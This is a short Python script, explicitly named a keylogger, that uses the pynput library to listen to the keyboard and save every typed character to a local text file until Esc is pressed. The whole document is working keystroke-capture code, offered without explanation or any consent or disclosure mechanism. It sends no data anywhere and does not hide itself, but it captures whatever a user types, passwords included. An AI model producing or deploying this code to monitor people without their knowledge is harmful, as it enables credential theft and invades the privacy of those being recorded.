import os
from pynput import keyboard
file = "keylogger.txt"
text_buffer = []
if not os.path.exists(file):
    with open(file, "w") as f:
        pass

def save_buffer():
    with open(file, "w") as f:
        f.write("".join(text_buffer))

def on_press(key):
    try:
        if key.char:
            text_buffer.append(key.char)

    except AttributeError:
        if key == keyboard.Key.backspace:
            if text_buffer:
                text_buffer.pop()
    save_buffer()

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    if key == keyboard.Key.space:
        text_buffer.append(" ")
    if key == keyboard.Key.enter:
        text_buffer.append("\n")
    return None

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
